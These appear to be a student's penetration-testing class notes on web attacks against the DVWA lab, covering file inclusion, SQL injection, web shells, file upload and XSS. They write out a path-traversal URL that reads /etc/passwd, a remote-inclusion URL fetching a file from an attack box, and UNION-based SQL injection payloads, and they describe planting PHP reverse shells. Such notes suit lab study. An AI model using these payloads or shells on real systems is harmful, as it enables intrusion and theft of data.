== LFI ==
#Look for things that have ?something=something and replace:
	ex: [[http://[target%20box]/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd]]
#Check for other locations in [[../../0x1_Recon/0x1A_POI|places of interest]].

== RFI ==
#Lets the server access something that you have on your machine.
	ex: [[http://[target%20box]/dvwa/vulnerabilities/fi/?page=http://[attack%20box]/exploit.txt]]

== Metasploit ==
#Often times metasploit will have exploits for LFI/RFI listed in exploit-db. You may to to capture certain pieces of information with burpsuite.

== BurpSuite ==
#As well as being used in conjunction with burpsuite you can also use it to intercept and execute payloads all by itself. Read the VHL manual or look at the following link for more.

== RCE ==

== SQL Injection ==
#Notes from class and VHL will cover specific ways to deal with it. 
	0' or 0=0 UNION SELECT table_schema, table_name from information_schema.tables 
	
	Product?= 1 [AND / OR] ---> UNION SELECT table_schema,table_name,column_name from information_schema.columns where table_schema = database()

== Web Shells ==
#On sites that you have access to themes, or plugins, you can add lines of code to run that create a reverse shell. Look through useful code snippets specifically [[../../../Useful_code_snippets/PHP_Rev_Shell_Script.txt|PHP Rev Shell]] to see some examples of things you can add. It usually requires a netcat listener on your device and to adjust the IP of each shell. Run through the steps of stabilizing a shell from the [[../|gain a foot hold]] section if necessary.

== File Upload ==
#If you see you can upload files try uploading the [[../../../Useful_code_snippets/PHP_Rev_Shell_Script.txt|PHP Rev Shell]] you may need to use burpsuite to overcome certain obstables. Reference the VHL manual. Once uploaded you'll just need to navigate to the directory in the URL. You may also need to insert the one line code for RCE into the properties section of an image or another file. Look for other ways you can upload, whether through FTP or something else, if you find a location that has files uploaded.

== Cross Site Scripting ==
#Use javascript to inject code into fields that are unsanitized. For more info look at VHL or the class notes.
